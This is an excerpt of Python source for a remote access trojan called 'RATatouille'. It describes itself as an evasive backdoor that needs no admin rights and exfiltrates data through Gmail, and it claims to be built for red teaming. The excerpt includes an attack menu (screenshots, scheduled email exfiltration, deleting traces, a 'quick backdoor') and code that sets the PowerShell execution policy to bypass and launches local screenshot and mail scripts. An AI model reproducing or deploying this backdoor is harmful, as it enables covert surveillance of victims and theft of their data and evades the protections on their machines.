...
def logo():
 ...
 \ |,"( /`--""              `.     _   _   _   _   _   _   _   _   _   _    _   
  \/ o                        \   / \ / \ / \ / \ / \ / \ / \ / \ / \ / \  / \ 
  (   _.-.              ,'"    ; ( R | A | T | a | t | o | u | i | l | l | e | 
   |\"   /`. \  ,      /       |   \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/  \_/ 
   | \  ' .'`.; |      |       \.______________________________
     _-'.'    | |--.....\_    \________------------""""""""""""
    ..."   _-'.'       ___"-   )	A little RAT that cooks up chaos
          ..."        ------~""
...
[+] GitHub        : @Bidaoui4905
[+] Description   : A modular Python based backdoor that uses Gmail for Data Exfiltration.
[+] Features      : No admin rights required | Lightweight | Highly evasive | Modular & extensible
[+] Disclaimer    : Built strictly for ethical red teaming and guided penetration testing assesement .
[+] Inspired By   : Viralmaniar's PowerShell-RAT
[+] Python        : v3.6.3+
[+] PowerShell    : v5.1
...
2. Screenshot
3. Schedule a Screenshot
4. Data Exfiltration via email
5. Schedule a mail for Data Exfiltration
6. Delete Screenshots
7. Schedule Screenshots Delete
8. Quick backdoor (All of the above)
9. Exit
'''
...
def cmd_exectionPolicy():
	...
	process=subprocess.Popen(["powershell","Set-ExecutionPolicy bypass -Scope CurrentUser"], shell=False);
...
def cmd_takeScreenshot():
	...
	process=subprocess.Popen(["powershell","C:\\Users\\user\\Documents\\PFE\\Pentest\\tools\\Powershell-RAT\\Shoot.ps1"], shell=False);
...
def cmd_sendMail():
	...
	process=subprocess.Popen(["powershell","C:\\Users\\user\\Documents\\PFE\\Pentest\\tools\\Powershell-RAT\\Mail.ps1"], shell=False);
